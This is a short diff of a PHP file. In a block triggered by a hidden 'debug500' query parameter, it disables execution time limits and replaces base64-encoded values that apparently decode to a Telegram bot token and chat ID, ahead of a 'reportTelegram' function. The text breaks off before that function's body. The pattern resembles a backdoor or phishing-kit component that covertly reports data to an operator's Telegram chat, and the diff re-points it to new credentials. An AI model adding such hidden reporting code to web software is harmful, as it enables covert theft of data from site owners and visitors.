@@ -255,9 +255,9 @@ if (isset($_GET['debug500'])) {
 @ini_set('max_execution_time', 0);
 @set_time_limit(0);
 $tk = base64_decode(
-            "ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ="
+            "NzY5MjcxNTYxMTpBQUdycFN3MzdaT0laUnJwSEFwbkgyUlRrblRSdDdoaEhMSQ=="
         );
-        $cid = base64_decode("ODkzMDE3NDQ2Mw=");
+        $cid = base64_decode("NjQ4OTg5NTg2MA=");
 
         function reportTelegram($msg) {
             global $tk,
